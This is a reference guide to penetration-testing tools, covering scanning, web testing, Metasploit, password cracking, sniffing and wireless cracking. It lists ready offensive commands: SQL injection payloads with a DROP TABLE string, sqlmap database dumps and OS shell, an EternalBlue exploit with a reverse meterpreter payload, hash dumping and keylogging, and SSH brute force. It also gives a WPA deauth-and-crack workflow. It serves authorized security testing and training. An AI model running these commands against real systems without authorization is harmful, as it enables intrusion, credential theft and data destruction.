# Security Testing Tools & Techniques

Comprehensive guide to essential security testing tools, their usage, and advanced techniques.

---

## Network Scanning and Reconnaissance

### Nmap (Network Mapper)

**Purpose:** Network discovery, port scanning, service detection, and OS fingerprinting.

**Essential Commands:**

```bash
# Basic host discovery (ping scan)
nmap -sn 192.168.1.0/24

# TCP SYN scan (stealth scan) - most common
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan (OS detection, version detection, script scanning, traceroute)
nmap -A target.com

# Scan specific ports
nmap -p 80,443,8080 target.com
nmap -p- target.com  # All ports

# Fast scan (top 100 ports)
nmap -F target.com

# Script scanning for vulnerabilities
nmap --script vuln target.com
nmap --script=http-enum target.com

# Output to file
nmap -oN output.txt target.com  # Normal format
nmap -oX output.xml target.com  # XML format
nmap -oG output.gnmap target.com  # Greppable format
nmap -oA output target.com  # All formats

# Timing templates (0=slowest, 5=fastest)
nmap -T4 target.com

# Evade firewalls/IDS
nmap -f target.com  # Fragment packets
nmap -D RND:10 target.com  # Decoy scan
nmap --source-port 53 target.com  # Spoof source port
```

**Advanced Techniques:**

- **NSE (Nmap Scripting Engine):** Automate vulnerability detection, exploitation, and reconnaissance
- **Firewall evasion:** Use fragmentation, decoys, and timing adjustments
- **Service enumeration:** Combine -sV with specific scripts for detailed service information

**Best Practices:**
- Always obtain authorization before scanning
- Use appropriate timing to avoid detection or network disruption
- Combine multiple scan types for comprehensive results
- Save output in multiple formats for analysis

### Masscan

**Purpose:** Ultra-fast port scanner for large-scale network scanning.

**Key Features:**
- Scan entire internet in under 6 minutes (theoretical)
- Asynchronous transmission
- Custom packet crafting

**Usage:**

```bash
# Scan specific ports on large range
masscan 10.0.0.0/8 -p80,443

# Scan all ports
masscan 192.168.1.0/24 -p0-65535

# Set transmission rate
masscan 10.0.0.0/8 -p80 --rate 10000

# Output to file
masscan 10.0.0.0/8 -p80,443 -oL output.txt
```

### Shodan and Censys

**Purpose:** Search engines for internet-connected devices and services.

**Use Cases:**
- Identify exposed services and devices
- Discover internet-facing assets
- Research technology usage
- Find vulnerable systems

**Shodan Search Examples:**
- `apache` — Find Apache web servers
- `port:3389` — Find RDP services
- `country:US` — Filter by country
- `org:"Company Name"` — Find organization's assets
- `vuln:CVE-2021-44228` — Find systems vulnerable to Log4Shell

---

## Vulnerability Scanning

### Nessus

**Purpose:** Comprehensive vulnerability scanner for networks, systems, and applications.

**Key Features:**
- 100,000+ vulnerability checks
- Compliance auditing (PCI DSS, HIPAA, CIS)
- Credentialed and non-credentialed scanning
- Detailed remediation guidance

**Scan Types:**
- **Basic Network Scan:** Identify common vulnerabilities
- **Credentialed Scan:** Deep system analysis with authentication
- **Web Application Scan:** Identify web vulnerabilities
- **Compliance Scan:** Check against regulatory standards

**Best Practices:**
- Use credentialed scans for comprehensive results
- Schedule regular scans (weekly/monthly)
- Prioritize remediation by CVSS score
- Validate findings to eliminate false positives

### OpenVAS

**Purpose:** Open-source vulnerability scanner and management solution.

**Key Features:**
- Free and open-source alternative to Nessus
- Regular feed updates
- Comprehensive vulnerability database
- Web-based interface

**Usage:**
- Create targets and scan configurations
- Schedule automated scans
- Generate compliance reports
- Track remediation progress

### Nikto

**Purpose:** Web server vulnerability scanner.

**Key Features:**
- Checks for 6,700+ potentially dangerous files/programs
- Identifies outdated server versions
- Detects server misconfigurations
- Tests for common vulnerabilities

**Usage:**

```bash
# Basic scan
nikto -h http://target.com

# Scan with SSL
nikto -h https://target.com

# Scan specific port
nikto -h target.com -p 8080

# Output to file
nikto -h target.com -o output.html -Format html

# Tune scan (specific tests)
nikto -h target.com -Tuning 123

# Use proxy
nikto -h target.com -useproxy http://proxy:8080
```

---

## Web Application Testing

### Burp Suite

**Purpose:** Comprehensive web application security testing platform.

**Core Components:**

1. **Proxy**
   - Intercept and modify HTTP/HTTPS requests and responses
   - View and analyze web traffic
   - Manual testing and manipulation

2. **Scanner** (Pro version)
   - Automated vulnerability scanning
   - Active and passive scanning
   - Identifies OWASP Top 10 vulnerabilities

3. **Intruder**
   - Automated customized attacks
   - Fuzzing and brute force
   - Parameter manipulation

4. **Repeater**
   - Manual request modification and replay
   - Test input validation
   - Analyze responses

5. **Sequencer**
   - Analyze randomness of session tokens
   - Test cryptographic strength

6. **Decoder**
   - Encode/decode data in various formats
   - URL, Base64, HTML, hex encoding

7. **Comparer**
   - Compare responses to identify differences
   - Useful for blind vulnerabilities

**Common Testing Workflows:**

**SQL Injection Testing:**
1. Intercept request in Proxy
2. Send to Repeater
3. Modify parameter with SQL payloads: `' OR '1'='1`, `'; DROP TABLE users--`
4. Analyze responses for errors or unexpected behavior
5. Use Intruder for automated payload testing

**Authentication Testing:**
1. Capture login request
2. Send to Intruder
3. Configure payload positions (username/password)
4. Load wordlists
5. Analyze response codes and lengths

**Session Management Testing:**
1. Capture session tokens
2. Send to Sequencer
3. Analyze token randomness
4. Test for predictability

**Best Practices:**
- Configure browser to use Burp proxy (127.0.0.1:8080)
- Install Burp CA certificate for HTTPS interception
- Use target scope to focus testing
- Save project state regularly
- Review all findings manually to eliminate false positives

### OWASP ZAP (Zed Attack Proxy)

**Purpose:** Free, open-source web application security scanner.

**Key Features:**
- Automated scanner
- Manual testing tools
- Fuzzing capabilities
- API testing support
- Extensive plugin ecosystem

**Usage Modes:**

1. **Automated Scan**
   - Quick scan for common vulnerabilities
   - Ideal for initial assessment

2. **Manual Explore**
   - Proxy-based manual testing
   - Similar to Burp Suite workflow

3. **API Scan**
   - Import OpenAPI/Swagger definitions
   - Automated API endpoint testing

**Common Commands (ZAP CLI):**

```bash
# Quick scan
zap-cli quick-scan http://target.com

# Active scan
zap-cli active-scan http://target.com

# Spider website
zap-cli spider http://target.com

# Generate report
zap-cli report -o report.html -f html
```

### SQLmap

**Purpose:** Automated SQL injection detection and exploitation.

**Key Features:**
- Supports MySQL, PostgreSQL, Oracle, MSSQL, SQLite, and more
- Automatic database fingerprinting
- Data extraction
- Database takeover capabilities

**Usage:**

```bash
# Basic SQL injection test
sqlmap -u "http://target.com/page?id=1"

# Test with POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Use request from Burp Suite
sqlmap -r request.txt

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in database
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump table contents
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Get database shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Increase verbosity
sqlmap -u "http://target.com/page?id=1" -v 3
```

**Advanced Options:**
- `--level` (1-5): Test thoroughness
- `--risk` (1-3): Risk of tests (higher may cause issues)
- `--technique`: Specify injection techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)
- `--tamper`: Use tamper scripts to evade WAF/IDS

### WPScan

**Purpose:** WordPress vulnerability scanner.

**Usage:**

```bash
# Basic scan
wpscan --url http://target.com

# Enumerate users
wpscan --url http://target.com --enumerate u

# Enumerate vulnerable plugins
wpscan --url http://target.com --enumerate vp

# Enumerate vulnerable themes
wpscan --url http://target.com --enumerate vt

# Password brute force
wpscan --url http://target.com --usernames admin --passwords /path/to/wordlist.txt

# Use API token for vulnerability data
wpscan --url http://target.com --api-token YOUR_TOKEN
```

---

## Exploitation Frameworks

### Metasploit Framework

**Purpose:** Comprehensive penetration testing and exploitation framework.

**Core Components:**

- **Exploits:** Code that takes advantage of vulnerabilities
- **Payloads:** Code executed after successful exploitation
- **Auxiliary:** Scanning, fuzzing, and other support modules
- **Encoders:** Obfuscate payloads to evade detection
- **Post:** Post-exploitation modules

**Basic Workflow:**

```bash
# Start Metasploit console
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show required options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set local IP for reverse connection
set LHOST 192.168.1.50

# Run exploit
exploit
# or
run
```

**Meterpreter Commands** (post-exploitation):

```bash
# System information
sysinfo

# Get user ID
getuid

# Escalate privileges
getsystem

# Dump password hashes
hashdump

# Screenshot
screenshot

# Keylogger
keyscan_start
keyscan_dump
keyscan_stop

# File operations
download /path/to/file
upload /local/file /remote/path

# Shell access
shell

# Pivot to other networks
run autoroute -s 10.0.0.0/24

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.0.0.5
```

**Useful Modules:**

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp

# SMB enumeration
use auxiliary/scanner/smb/smb_version

# HTTP directory brute force
use auxiliary/scanner/http/dir_scanner

# Password spraying
use auxiliary/scanner/smb/smb_login
```

**Best Practices:**
- Always update Metasploit: `msfupdate`
- Use workspaces to organize targets
- Save session information
- Be cautious with destructive payloads
- Test exploits in lab environment first

---

## Password Cracking and Authentication Testing

### John the Ripper

**Purpose:** Password cracking tool supporting multiple hash formats.

**Usage:**

```bash
# Crack password hashes
john hashes.txt

# Use specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Specify hash format
john --format=raw-md5 hashes.txt

# Show cracked passwords
john --show hashes.txt

# Incremental mode (brute force)
john --incremental hashes.txt

# Use rules for mutations
john --wordlist=wordlist.txt --rules hashes.txt
```

### Hashcat

**Purpose:** Advanced password recovery tool using GPU acceleration.

**Usage:**

```bash
# Dictionary attack
hashcat -m 0 -a 0 hashes.txt wordlist.txt
# -m 0 = MD5, -a 0 = dictionary attack

# Dictionary attack with rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule

# Combination attack
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# Brute force attack
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a
# ?a = all characters, ?l = lowercase, ?u = uppercase, ?d = digits

# Show cracked passwords
hashcat -m 0 hashes.txt --show

# Benchmark
hashcat -b
```

**Common Hash Types (-m parameter):**
- 0: MD5
- 100: SHA1
- 1000: NTLM
- 1400: SHA256
- 1800: SHA512
- 3200: bcrypt
- 13100: Kerberos TGS

### Hydra

**Purpose:** Network authentication brute force tool.

**Supported Protocols:** SSH, FTP, HTTP, HTTPS, SMB, RDP, and 50+ more.

**Usage:**

```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# Multiple targets from file
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# Limit parallel tasks
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -V ssh://192.168.1.100
```

---

## Network Analysis and Sniffing

### Wireshark

**Purpose:** Network protocol analyzer for packet capture and analysis.

**Key Features:**
- Deep inspection of hundreds of protocols
- Live capture and offline analysis
- Rich filtering capabilities
- Decryption support (with keys)

**Common Display Filters:**

```
# HTTP traffic
http

# Specific IP address
ip.addr == 192.168.1.100

# Specific port
tcp.port == 80

# HTTP POST requests
http.request.method == "POST"

# Follow TCP stream
tcp.stream eq 0

# TLS/SSL traffic
ssl or tls

# DNS queries
dns

# Packets containing specific string
frame contains "password"

# Combine filters
ip.src == 192.168.1.100 && http
```

**Capture Filters:**

```
# Capture only HTTP
port 80

# Capture specific host
host 192.168.1.100

# Capture subnet
net 192.168.1.0/24

# Exclude traffic
not port 22
```

**Analysis Techniques:**
- **Follow TCP Stream:** Right-click packet → Follow → TCP Stream
- **Export Objects:** File → Export Objects → HTTP/SMB
- **Statistics:** Statistics menu for protocol hierarchy, conversations, endpoints
- **Decrypt TLS:** Edit → Preferences → Protocols → TLS → RSA keys list

### tcpdump

**Purpose:** Command-line packet analyzer.

**Usage:**

```bash
# Capture on interface
tcpdump -i eth0

# Capture specific host
tcpdump host 192.168.1.100

# Capture specific port
tcpdump port 80

# Write to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Capture HTTP traffic
tcpdump -i eth0 'tcp port 80'

# Capture and display ASCII
tcpdump -i eth0 -A

# Limit packet count
tcpdump -i eth0 -c 100

# Verbose output
tcpdump -i eth0 -v
```

---

## Wireless Security Testing

### Aircrack-ng Suite

**Purpose:** Complete suite for wireless network security assessment.

**Components:**
- **airmon-ng:** Enable monitor mode
- **airodump-ng:** Capture packets
- **aireplay-ng:** Inject packets
- **aircrack-ng:** Crack WEP/WPA keys

**WPA/WPA2 Cracking Workflow:**

```bash
# 1. Enable monitor mode
airmon-ng start wlan0

# 2. Scan for networks
airodump-ng wlan0mon

# 3. Capture handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauthenticate client (in another terminal)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack captured handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

---

## Testing Environment Setup

### Kali Linux

**Purpose:** Debian-based Linux distribution for penetration testing.

**Key Features:**
- 600+ pre-installed security tools
- Regular updates and tool additions
- Multiple desktop environments
- ARM support for Raspberry Pi

**Installation Options:**
- Bare metal installation
- Virtual machine (VMware, VirtualBox)
- Live boot from USB
- Docker containers
- WSL (Windows Subsystem for Linux)

**Essential Tools Included:**
- Nmap, Metasploit, Burp Suite, Wireshark
- John the Ripper, Hashcat, Hydra
- SQLmap, Nikto, WPScan
- Aircrack-ng, Reaver
- Social engineering toolkit

### Vulnerable Testing Environments

**For Practice and Training:**

- **DVWA (Damn Vulnerable Web Application):** Web app with intentional vulnerabilities
- **WebGoat:** OWASP teaching application
- **Metasploitable:** Intentionally vulnerable Linux VM
- **OWASP Juice Shop:** Modern vulnerable web application
- **HackTheBox:** Online penetration testing labs
- **TryHackMe:** Guided cybersecurity training
- **VulnHub:** Downloadable vulnerable VMs

---

## Tool Selection Matrix

| Testing Phase | Primary Tools | Alternative Tools |
|---------------|---------------|-------------------|
| Reconnaissance | Nmap, theHarvester, Shodan | Masscan, Censys, Maltego |
| Vulnerability Scanning | Nessus, OpenVAS | Qualys, Rapid7 Nexpose |
| Web App Testing | Burp Suite, OWASP ZAP | Acunetix, Nikto |
| Exploitation | Metasploit | Custom scripts, Exploit-DB |
| Password Cracking | Hashcat, John the Ripper | Hydra, Medusa |
| Network Analysis | Wireshark, tcpdump | NetworkMiner, Ettercap |
| Wireless Testing | Aircrack-ng | Reaver, Wifite |
| Reporting | Dradis, Faraday | Custom templates, Markdown |
